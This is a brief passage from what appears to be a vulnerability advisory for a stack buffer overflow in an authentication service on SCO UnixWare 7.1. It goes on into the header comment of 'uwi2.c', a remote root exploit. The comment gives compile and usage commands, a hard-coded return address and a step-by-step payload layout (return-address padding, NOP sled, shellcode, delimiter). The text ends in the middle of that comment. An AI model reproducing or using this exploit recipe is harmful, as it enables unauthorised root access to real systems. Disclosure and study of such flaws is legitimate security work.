It is shipped with SCO Unixware and installed running as root by default. In its authentication mechanism exists a serious buffer overflow vulnerability. The username/password buffers are of a fixed length ( 88+ characters ) with no bounds checking performed on them. Because of this it is possible to overflow the buffer , corrupt the stack and overwrite the return address altering the flow of execution ( and running arbitrary code ) . It should be noted that exploit code must be encoded ( base64 ) before being sent to the server. ， / * uwi2.c ，  * i2o remote root exploit for UnixWare 7.1 ，  * compile on UnixWare with cc -o uwi2 uwi2.c -lsocket -lnsl ，  * ./uwi2 <hostname> = ，  * The hard-coded RET address is 0x8047d4c = ，  * To either replace the shellcode or change the offset you must = ，  * first craft a program which outputs , in this order :  ，  * - 92 bytes of your RET address ( EIP starts at 89 )  ，  * - NOPs , as many as you would like ，  * - your shellcode ，  * - the character \" : \" ，  * - any character , maybe \"A\" , as I've done below ，  * - NULL ，  * When",
